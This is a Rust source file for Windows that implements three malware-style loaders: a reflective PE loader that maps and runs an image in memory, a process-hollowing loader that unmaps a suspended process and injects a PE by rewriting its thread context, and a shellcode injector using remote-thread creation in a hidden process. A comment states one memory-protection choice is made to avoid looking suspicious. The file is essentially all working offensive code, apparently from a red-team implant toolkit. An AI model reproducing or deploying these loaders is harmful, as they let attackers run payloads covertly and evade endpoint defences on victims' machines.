#![cfg(target_family = "windows")]

use crate::utils::structures::{
    IMAGE_nt_headS64, IMAGE_DOS_HEADER, IMAGE_IMPORT_DESCRIPTOR, IMAGE_SECTION_HEADER,
    MY_IMAGE_BASE_RELOCATION, MY_IMAGE_THUNK_DATA64,
};
use crate::utils::tools::*;

use std::error::Error;
use std::ffi::c_void;
use std::mem::transmute;

use ntapi::ntmmapi::NtUnmapViewOfSection;
use ntapi::winapi::um::winnt::CONTEXT_INTEGER;
use windows_sys::Win32::Foundation::{CloseHandle, GetLastError};
use windows_sys::Win32::System::Diagnostics::Debug::{
    GetThreadContext, ReadProcessMemory, SetThreadContext, WriteProcessMemory,
};
use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualAllocEx, VirtualFree, VirtualProtectEx,
};
use windows_sys::Win32::System::Threading::{
    CreateProcessA, CreateRemoteThread, CreateThread, GetCurrentProcess, NtQueryInformationProcess,
    ResumeThread, WaitForSingleObject, PROCESSINFOCLASS, PROCESS_BASIC_INFORMATION, STARTUPINFOA,
};

pub fn reflective_loader(buf: Vec<u8>) -> Result<(), Box<dyn Error>> {
    //Retrieve the sizes of the headers and the PE image in memory
    let header_s = get_size(&buf, "header");
    let img_s = get_size(&buf, "image");
    if header_s == 0 || img_s == 0 {
        return Err("Error retrieving PE sizes".into());
    }

    unsafe {
        let base = VirtualAlloc(std::ptr::null_mut(), img_s, 0x1000, 0x04);

        //Retrieve the DOS magic header and the elfa new (address of the begining of the PE after the DOS header)
        WriteProcessMemory(
            GetCurrentProcess(),
            base,
            buf.as_ptr() as *const c_void,
            header_s,
            std::ptr::null_mut(),
        );

        let mut dos_head = IMAGE_DOS_HEADER::default();
        fill_structure_from_array(&mut dos_head, &buf);

        log::debug!("DOS magic header : {:x?}", dos_head.e_magic);
        log::debug!(
            "Elfa new (address of the begining of the PE): {:x?}",
            dos_head.e_lfanew
        );

        //Retrieve the NT headers starting at the elfa new address
        let mut nt_head = IMAGE_nt_headS64::default();
        fill_structure_from_memory(
            &mut nt_head,
            (base as isize + dos_head.e_lfanew as isize) as *const c_void,
            GetCurrentProcess(),
        );

        log::debug!("NT headers : {:#x?}", nt_head);

        //Retrieve the sections (following the NT headers), their sizes, and map their contents from disk into memory
        let mut sections: Vec<IMAGE_SECTION_HEADER> =
            vec![IMAGE_SECTION_HEADER::default(); nt_head.FileHeader.NumberOfSections as usize];
        for i in 0..sections.len() {
            fill_structure_from_memory(
                &mut sections[i],
                (base as usize
                    + dos_head.e_lfanew as usize
                    + std::mem::size_of_val(&nt_head) as usize
                    + (i * std::mem::size_of::<IMAGE_SECTION_HEADER>() as usize))
                    as *const c_void,
                GetCurrentProcess(),
            );
            log::debug!(
                "Virtual addresses of sections {} is {:#x?}",
                string_from_array(&mut sections[i].Name.to_vec()),
                sections[i].VirtualAddress
            );

            //Retrieve the content of one section (a buffer starting at the RawAddr to RawAddr + RawSize)
            //Write it into memory at the addr base+VA
            let tmp: Vec<u8> = buf[sections[i].PointerToRawData as usize
                ..(sections[i].PointerToRawData as usize + sections[i].SizeOfRawData as usize)]
                .to_vec();
            WriteProcessMemory(
                GetCurrentProcess(),
                (base as usize + sections[i].VirtualAddress as usize) as *mut c_void,
                tmp.as_ptr() as *const c_void,
                tmp.len(),
                std::ptr::null_mut(),
            );
        }

        //Retrieve the imports and fix them
        log::debug!("{:?}", nt_head.OptionalHeader);
        if nt_head.OptionalHeader.ImportTable.Size > 0 {
            //Data addr before loading in memory
            let mut origin_first_thunk =
                base as usize + nt_head.OptionalHeader.ImportTable.VirtualAddress as usize;
            loop {
                //Data structure of the imported DLL
                let mut image_descriptor = IMAGE_IMPORT_DESCRIPTOR::default();
                fill_structure_from_memory(
                    &mut image_descriptor,
                    origin_first_thunk as *const c_void,
                    GetCurrentProcess(),
                );
                if image_descriptor.Name == 0 && image_descriptor.FirstThunk == 0 {
                    log::debug!("No more import");
                    break;
                } else {
                    //Retrieve the DLL name and load it by retrieving the name at this address pointed by Name
                    let import_name = read_from_memory(
                        (base as usize + image_descriptor.Name as usize) as *const c_void,
                        GetCurrentProcess(),
                    );
                    let load_dll = LoadLibraryA(import_name.as_bytes().as_ptr() as *const u8);
                    log::debug!("Import DLL name : {}", import_name);

                    //Get pointer of the first thunk of data containing the data of the first imported function
                    let mut thunk_ptr = base as usize
                        + image_descriptor.Characteristics_or_OriginalFirstThunk as usize;
                    let mut i = 0;

                    //Parse each thunk one by one to retrieve all the imported functions
                    loop {
                        let mut thunk_data = MY_IMAGE_THUNK_DATA64::default();
                        fill_structure_from_memory(
                            &mut thunk_data,
                            (thunk_ptr as usize) as *const c_void,
                            GetCurrentProcess(),
                        );
                        log::debug!("{:?}", thunk_data);
                        if thunk_data.Address == [0; 8]
                            && u64::from_ne_bytes(thunk_data.Address.try_into().unwrap())
                                < 0x8000000000000000
                        {
                            log::debug!("No more data");
                            break;
                        } else {
                            //For each function, retrieve its name and its addr in memory
                            let offset = u64::from_ne_bytes(thunk_data.Address.try_into().unwrap());
                            let function_name = read_from_memory(
                                (base as usize + offset as usize + 2) as *const c_void,
                                GetCurrentProcess(),
                            );
                            log::debug!("Function : {}", function_name);

                            let function_addr = i64::to_ne_bytes(
                                GetProcAddress(
                                    load_dll,
                                    function_name.as_bytes().as_ptr() as *const u8,
                                )
                                .unwrap() as i64,
                            );

                            //Write the function and its data in memory at its addr
                            WriteProcessMemory(
                                GetCurrentProcess(),
                                ((base as usize + image_descriptor.FirstThunk as usize) + i * 8)
                                    as *mut c_void,
                                function_addr.as_ptr() as *const c_void,
                                function_addr.len(),
                                std::ptr::null_mut(),
                            );

                            i += 1;
                            thunk_ptr += 8;
                        }
                    }

                    origin_first_thunk += std::mem::size_of::<IMAGE_IMPORT_DESCRIPTOR>();
                }
            }
        }

        //Fix base relocations in case of hardcoded values
        if nt_head.OptionalHeader.BaseRelocationTable.Size > 0 {
            //Calculate the delta and retrieve the first relocation ptr
            let delta = base as usize - nt_head.OptionalHeader.ImageBase as usize;
            let mut first_reloc_ptr =
                base as usize + nt_head.OptionalHeader.BaseRelocationTable.VirtualAddress as usize;

            loop {
                //Fill the relocation structure from the struct at the ptr (retrieve relocation RVA and block size)
                let mut reloc = MY_IMAGE_BASE_RELOCATION::default();
                fill_structure_from_memory(
                    &mut reloc,
                    first_reloc_ptr as *const c_void,
                    GetCurrentProcess(),
                );

                if reloc.SizeofBlock == 0 {
                    log::debug!("No more relocation");
                    break;
                } else {
                    log::debug!("Size of block : {:x?}", reloc.SizeofBlock);
                    log::debug!("Virtual addr : {:x?}", reloc.VirtualAddress);

                    //For each each entries, retrieve the offset from the page addr and the hardcoded values at the relocation RVA
                    let entries = (reloc.SizeofBlock - 8) / 2;
                    log::debug!("Entries : {:x?}", entries);
                    for i in 0..entries {
                        let mut offset_from_page: [u8; 2] = [0; 2];

                        ReadProcessMemory(
                            GetCurrentProcess(),
                            (first_reloc_ptr + 8 + (i * 2) as usize) as *const c_void,
                            offset_from_page.as_mut_ptr() as *mut c_void,
                            2,
                            std::ptr::null_mut(),
                        );

                        log::debug!("Offset : {:x?}", offset_from_page);
                        let temp = u16::from_ne_bytes(offset_from_page.try_into().unwrap());

                        //println!("{:x?}",temp&0x0fff);

                        if (temp >> 12) == 0xA {
                            //Calculate relocation RVA of each entries with the base addr + relocation RVA of the first block + offset
                            // 1&0=0  0&0=0
                            let block_reloc_rva = base as usize
                                + reloc.VirtualAddress as usize
                                + (temp & 0x0fff) as usize;

                            //Read the hardcoded values at the entry addr and translate to obtain the fixed addr
                            let mut harcoded_value: [u8; 8] = [0; 8];
                            ReadProcessMemory(
                                GetCurrentProcess(),
                                block_reloc_rva as *const c_void,
                                harcoded_value.as_mut_ptr() as *mut c_void,
                                8,
                                std::ptr::null_mut(),
                            );

                            log::debug!("Harcoded value at RVA : {:x?}", harcoded_value);
                            let fixe_addr =
                                isize::from_ne_bytes(harcoded_value.try_into().unwrap())
                                    + delta as isize;

                            log::debug!("{:x?}", fixe_addr);
                            //Write into memory
                            WriteProcessMemory(
                                GetCurrentProcess(),
                                block_reloc_rva as *mut c_void,
                                fixe_addr.to_ne_bytes().as_ptr() as *const c_void,
                                8,
                                std::ptr::null_mut(),
                            );
                        }
                    }
                }

                first_reloc_ptr += reloc.SizeofBlock as usize;
            }
        }

        //Change the Read/Write memory access to Read/Write/Execute
        let mut oldprotect = 0;
        VirtualProtectEx(GetCurrentProcess(), base, img_s, 0x40, &mut oldprotect);

        let thread = CreateThread(
            std::ptr::null_mut(),
            0,
            Some(transmute(
                (base as usize + nt_head.OptionalHeader.AddressOfEntryPoint as usize)
                    as *mut c_void,
            )),
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
        );

        WaitForSingleObject(thread, 10000);
        VirtualFree(base, 0, 0x00008000);
    }

    Ok(())
}

fn get_destination_base_addr(prochandle: isize) -> usize {
    unsafe {
        let mut process_information: PROCESS_BASIC_INFORMATION = std::mem::zeroed();
        let process_information_class = PROCESSINFOCLASS::default();
        let mut return_l = 0;
        NtQueryInformationProcess(
            prochandle,
            process_information_class,
            &mut process_information as *mut _ as *mut c_void,
            std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_l,
        );
        let peb_image_offset = process_information.PebBaseAddress as u64 + 0x10;
        let mut image_base_buffer = [0; std::mem::size_of::<&u8>()];
        ReadProcessMemory(
            prochandle,
            peb_image_offset as *const c_void,
            image_base_buffer.as_mut_ptr() as *mut c_void,
            image_base_buffer.len(),
            std::ptr::null_mut(),
        );

        log::debug!(
            "Image Base Addr : {:x?}",
            usize::from_ne_bytes(image_base_buffer)
        );
        return usize::from_ne_bytes(image_base_buffer);
    }
}

pub fn remote_loader(buf: Vec<u8>, pe_to_execute: &str) -> Result<(), Box<dyn Error>> {
    //Retrieve the sizes of the headers and the PE image in memory
    let header_s = get_size(&buf, "header");
    let img_s = get_size(&buf, "image");
    if header_s == 0 || img_s == 0 {
        return Err("Error retrieving PE sizes".into());
    }

    unsafe {
        let pe_to_execute = pe_to_execute.trim().to_owned() + "\0";
        let mut lp_startup_info: STARTUPINFOA = std::mem::zeroed();
        let mut lp_process_information: windows_sys::Win32::System::Threading::PROCESS_INFORMATION =
            std::mem::zeroed();
        CreateProcessA(
            pe_to_execute.as_ptr() as *const u8,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            0x00000004,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &mut lp_startup_info as *mut STARTUPINFOA,
            &mut lp_process_information
                as *mut windows_sys::Win32::System::Threading::PROCESS_INFORMATION,
        );
        if GetLastError() != 0 {
            log::debug!("{}", GetLastError());
            return Err(GetLastError().to_string().into());
        }

        let mut remote_base =
            get_destination_base_addr(lp_process_information.hProcess) as *mut c_void;
        let prochandle = lp_process_information.hProcess;
        let threadhandle = lp_process_information.hThread;

        //Set the memory access to Read/Write for the moment to avoid suspicious rwx
        let base = VirtualAlloc(std::ptr::null_mut(), img_s, 0x1000, 0x04);
        NtUnmapViewOfSection(
            prochandle as *mut ntapi::winapi::ctypes::c_void,
            remote_base as *mut ntapi::winapi::ctypes::c_void,
        );

        remote_base = VirtualAllocEx(prochandle, remote_base, img_s, 0x1000 + 0x2000, 0x04);

        //Retrieve the DOS magic header and the elfa new (address of the begining of the PE after the DOS header)
        WriteProcessMemory(
            prochandle,
            remote_base,
            buf.as_ptr() as *const c_void,
            header_s,
            std::ptr::null_mut(),
        );

        //Parsing locally
        std::ptr::copy(buf.as_ptr() as *const u8, base as *mut u8, header_s);

        let mut dos_head = IMAGE_DOS_HEADER::default();
        fill_structure_from_memory(&mut dos_head, base, GetCurrentProcess());

        log::debug!("DOS magic header : {:x?}", dos_head.e_magic);
        log::debug!(
            "Elfa new (address of the begining of the PE): {:x?}",
            dos_head.e_lfanew
        );

        //Retrieve the NT headers starting at the elfa new address
        let mut nt_head: IMAGE_nt_headS64 = IMAGE_nt_headS64::default();
        fill_structure_from_memory(
            &mut nt_head,
            (base as isize + dos_head.e_lfanew as isize) as *const c_void,
            GetCurrentProcess(),
        );

        log::debug!("NT headers : {:#x?}", nt_head);

        //Retrieve the sections (following the NT headers), their sizes, and map their contents from disk into memory
        let mut sections: Vec<IMAGE_SECTION_HEADER> =
            vec![IMAGE_SECTION_HEADER::default(); nt_head.FileHeader.NumberOfSections as usize];
        for i in 0..sections.len() {
            fill_structure_from_memory(
                &mut sections[i],
                (base as usize
                    + dos_head.e_lfanew as usize
                    + std::mem::size_of_val(&nt_head) as usize
                    + (i * std::mem::size_of::<IMAGE_SECTION_HEADER>() as usize))
                    as *const c_void,
                GetCurrentProcess(),
            );
            log::debug!(
                "Virtual addresses of sections {} is {:#x?}",
                string_from_array(&mut sections[i].Name.to_vec()),
                sections[i].VirtualAddress
            );

            //Retrieve the content of one section (a buffer starting at the RawAddr to RawAddr + RawSize)
            //Write it into memory at the addr base+VA
            let tmp: Vec<u8> = buf[sections[i].PointerToRawData as usize
                ..(sections[i].PointerToRawData as usize + sections[i].SizeOfRawData as usize)]
                .to_vec();

            WriteProcessMemory(
                GetCurrentProcess(),
                (base as usize + sections[i].VirtualAddress as usize) as *mut c_void,
                tmp.as_ptr() as *const c_void,
                sections[i].SizeOfRawData as usize,
                std::ptr::null_mut(),
            );
            WriteProcessMemory(
                prochandle,
                (remote_base as usize + sections[i].VirtualAddress as usize) as *mut c_void,
                tmp.as_ptr() as *const c_void,
                sections[i].SizeOfRawData as usize,
                std::ptr::null_mut(),
            );
        }

        //Retrieve the imports and fix them
        log::debug!("{:?}", nt_head.OptionalHeader);
        if nt_head.OptionalHeader.ImportTable.Size > 0 {
            //Data addr before loading in memory
            let mut origin_first_thunk =
                base as usize + nt_head.OptionalHeader.ImportTable.VirtualAddress as usize;
            loop {
                //Data structure of the imported DLL
                let mut image_descriptor = IMAGE_IMPORT_DESCRIPTOR::default();
                fill_structure_from_memory(
                    &mut image_descriptor,
                    origin_first_thunk as *const c_void,
                    GetCurrentProcess(),
                );
                if image_descriptor.Name == 0 && image_descriptor.FirstThunk == 0 {
                    log::debug!("No more import");
                    break;
                } else {
                    //Retrieve the DLL name and load it by retrieving the name at this address pointed by Name
                    let import_name = read_from_memory(
                        (base as usize + image_descriptor.Name as usize) as *const c_void,
                        GetCurrentProcess(),
                    );
                    let load_dll = LoadLibraryA(import_name.as_bytes().as_ptr() as *const u8);
                    log::debug!("Import DLL name : {}", import_name);

                    //Get pointer of the first thunk of data containing the data of the first imported function
                    let mut thunk_ptr = base as usize
                        + image_descriptor.Characteristics_or_OriginalFirstThunk as usize;
                    let mut i = 0;

                    //Parse each thunk one by one to retrieve all the imported functions
                    loop {
                        let mut thunk_data = MY_IMAGE_THUNK_DATA64::default();
                        fill_structure_from_memory(
                            &mut thunk_data,
                            (thunk_ptr as usize) as *const c_void,
                            GetCurrentProcess(),
                        );
                        log::debug!("{:x?}", thunk_data);
                        if thunk_data.Address == [0; 8]
                            && u64::from_ne_bytes(thunk_data.Address.try_into().unwrap())
                                < 0x8000000000000000
                        {
                            log::debug!("No more data");
                            break;
                        } else {
                            //For each function, retrieve its name and its addr in memory
                            let offset = u64::from_ne_bytes(thunk_data.Address.try_into().unwrap());
                            let function_name = read_from_memory(
                                (base as usize + offset as usize + 2) as *const c_void,
                                GetCurrentProcess(),
                            );
                            log::debug!("Function : {}", function_name);

                            let function_addr = i64::to_ne_bytes(
                                GetProcAddress(
                                    load_dll,
                                    function_name.as_bytes().as_ptr() as *const u8,
                                )
                                .unwrap() as i64,
                            );

                            //Write the function and its data in memory at its addr
                            WriteProcessMemory(
                                GetCurrentProcess(),
                                ((base as usize + image_descriptor.FirstThunk as usize) + i * 8)
                                    as *mut c_void,
                                function_addr.as_ptr() as *const c_void,
                                function_addr.len(),
                                std::ptr::null_mut(),
                            );

                            WriteProcessMemory(
                                prochandle,
                                ((remote_base as usize + image_descriptor.FirstThunk as usize)
                                    + i * 8) as *mut c_void,
                                function_addr.as_ptr() as *const c_void,
                                function_addr.len(),
                                std::ptr::null_mut(),
                            );

                            i += 1;
                            thunk_ptr += 8;
                        }
                    }

                    origin_first_thunk += std::mem::size_of::<IMAGE_IMPORT_DESCRIPTOR>();
                }
            }
        }

        //Fix base relocations in case of hardcoded values
        if nt_head.OptionalHeader.BaseRelocationTable.Size > 0 {
            //Calculate the delta and retrieve the first relocation ptr
            let delta = base as usize - nt_head.OptionalHeader.ImageBase as usize;
            let mut first_reloc_ptr =
                base as usize + nt_head.OptionalHeader.BaseRelocationTable.VirtualAddress as usize;

            loop {
                //Fill the relocation structure from the struct at the ptr (retrieve relocation RVA and block size)
                let mut reloc = MY_IMAGE_BASE_RELOCATION::default();
                fill_structure_from_memory(
                    &mut reloc,
                    first_reloc_ptr as *const c_void,
                    GetCurrentProcess(),
                );

                if reloc.SizeofBlock == 0 {
                    log::debug!("No more relocation");
                    break;
                } else {
                    log::debug!("Size of block : {:x?}", reloc.SizeofBlock);
                    log::debug!("Virtual addr : {:x?}", reloc.VirtualAddress);

                    //For each each entries, retrieve the offset from the page addr and the hardcoded values at the relocation RVA
                    let entries = (reloc.SizeofBlock - 8) / 2;
                    log::debug!("Entries : {:x?}", entries);
                    for i in 0..entries {
                        let mut offset_from_page: [u8; 2] = [0; 2];

                        ReadProcessMemory(
                            GetCurrentProcess(),
                            (first_reloc_ptr + 8 + (i * 2) as usize) as *const c_void,
                            offset_from_page.as_mut_ptr() as *mut c_void,
                            2,
                            std::ptr::null_mut(),
                        );

                        log::debug!("Offset : {:x?}", offset_from_page);
                        let temp = u16::from_ne_bytes(offset_from_page.try_into().unwrap());

                        //println!("{:x?}", temp & 0x0fff);

                        if (temp >> 12) == 0xA {
                            //Calculate relocation RVA of each entries with the base addr + relocation RVA of the first block + offset
                            // 1&0=0  0&0=0
                            let block_reloc_rva = base as usize
                                + reloc.VirtualAddress as usize
                                + (temp & 0x0fff) as usize;

                            //Read the hardcoded values at the entry addr and translate to obtain the fixed addr
                            let mut harcoded_value: [u8; 8] = [0; 8];
                            ReadProcessMemory(
                                GetCurrentProcess(),
                                block_reloc_rva as *const c_void,
                                harcoded_value.as_mut_ptr() as *mut c_void,
                                8,
                                std::ptr::null_mut(),
                            );

                            log::debug!("Harcoded value at RVA : {:x?}", harcoded_value);
                            let fixe_addr =
                                isize::from_ne_bytes(harcoded_value.try_into().unwrap())
                                    + delta as isize;

                            log::debug!("{:x?}", fixe_addr);
                            //Write into memory
                            WriteProcessMemory(
                                prochandle,
                                block_reloc_rva as *mut c_void,
                                fixe_addr.to_ne_bytes().as_ptr() as *const c_void,
                                8,
                                std::ptr::null_mut(),
                            );
                        }
                    }
                }

                first_reloc_ptr += reloc.SizeofBlock as usize;
            }
        }

        //Change the Read/Write memory access to Write/Execute
        let mut oldprotect = 0;
        VirtualProtectEx(prochandle, remote_base, img_s, 0x80, &mut oldprotect);

        let mut ctx = std::mem::zeroed::<windows_sys::Win32::System::Diagnostics::Debug::CONTEXT>();
        ctx.ContextFlags = CONTEXT_INTEGER;
        GetThreadContext(threadhandle, &mut ctx);
        ctx.Rcx = remote_base as u64 + nt_head.OptionalHeader.AddressOfEntryPoint as u64;
        SetThreadContext(threadhandle, &mut ctx);
        VirtualFree(base, 0, 0x00004000);
        ResumeThread(threadhandle);

        CloseHandle(prochandle);
    }

    Ok(())
}

pub fn shellcode_loader(shellcode: Vec<u8>, pe_to_execute: &str) -> Result<(), Box<dyn Error>> {
    let pe_to_execute = pe_to_execute.trim().to_owned() + "\0";
    unsafe {
        let mut lp_startup_info: STARTUPINFOA = std::mem::zeroed();
        let mut lp_process_information: windows_sys::Win32::System::Threading::PROCESS_INFORMATION =
            std::mem::zeroed();
        CreateProcessA(
            pe_to_execute.as_ptr() as *const u8,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            0x08000000, //No window
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &mut lp_startup_info,
            &mut lp_process_information,
        );

        if GetLastError() == 0 {
            let base = VirtualAllocEx(
                lp_process_information.hProcess,
                std::ptr::null_mut(),
                shellcode.len(),
                0x00001000,
                0x04,
            );
            WriteProcessMemory(
                lp_process_information.hProcess,
                base,
                shellcode.as_ptr() as *const c_void,
                shellcode.len(),
                0 as *mut usize,
            );
            let mut oldprotect = 0;
            VirtualProtectEx(
                lp_process_information.hProcess,
                base,
                shellcode.len(),
                0x20,
                &mut oldprotect,
            );
            CreateRemoteThread(
                lp_process_information.hProcess,
                std::ptr::null_mut(),
                0,
                Some(transmute(base)),
                std::ptr::null_mut(),
                0,
                std::ptr::null_mut(),
            );

            CloseHandle(lp_process_information.hProcess);
        } else {
            log::debug!("{}", GetLastError());
            return Err(GetLastError().to_string().into());
        }
    }
    Ok(())
}
